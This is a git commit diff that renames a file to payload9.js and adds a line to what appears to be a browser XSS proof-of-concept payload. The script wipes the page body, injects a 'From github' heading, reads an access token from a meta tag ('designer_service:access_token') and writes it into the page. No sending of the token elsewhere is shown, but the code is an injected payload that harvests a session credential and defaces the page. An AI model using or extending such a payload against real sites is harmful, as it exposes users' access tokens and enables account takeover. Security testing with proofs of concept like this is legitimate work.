5c6ae861a8cd88b9ed154dbd2028e6b8faddfa9a
Yuvaraj <98304205+yuvarajsf@users.noreply.github.com>
2025-10-08 13:16:41 +0530

    Update and rename payload8.js to payload9.js

--- payload9.js
+++ payload9.js
@@ -1,5 +1,6 @@
 function test(){
     console.log("HI");
+    document.body.innerHTML = "";
     document.body.innerHTML += "<h1 style='color:red'>From github</h1>";
     token = document.querySelector('meta[name="designer_service:access_token"]').content;
     document.body.innerHTML += token;
